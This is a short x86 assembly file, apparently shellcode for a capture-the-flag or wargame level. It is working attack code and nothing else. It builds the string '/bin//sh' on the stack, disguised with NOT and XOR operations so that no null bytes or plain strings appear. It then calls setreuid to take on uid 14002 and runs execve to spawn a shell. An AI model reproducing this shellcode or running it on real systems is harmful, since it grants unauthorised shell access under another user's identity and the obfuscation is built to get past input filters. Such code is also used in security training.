global _start

_start:
  xor esi,esi
  push esi

  mov esi,0x4a406b7a
  not esi
  xor esi,0xddccbbaa
  push dword esi
  
  mov esi,0x4c5a267a
  not esi
  xor esi,0xddccbbaa
  push dword esi

  xor ebx,ebx
  xor ecx,ecx
  xor edx,edx
  mul edx

  mov al,0x46           ;setreuid
  mov bx,0x36b2         ;ruid 14002
  mov cx,0x36b2         ;euid 14002
  int 0x80              ;call

  mov al,0xb
  mov ebx,esp
  xor ecx,ecx

  int 0x80

  xor ebx,ebx
  mul ebx
  mov al,1
  int 0x80

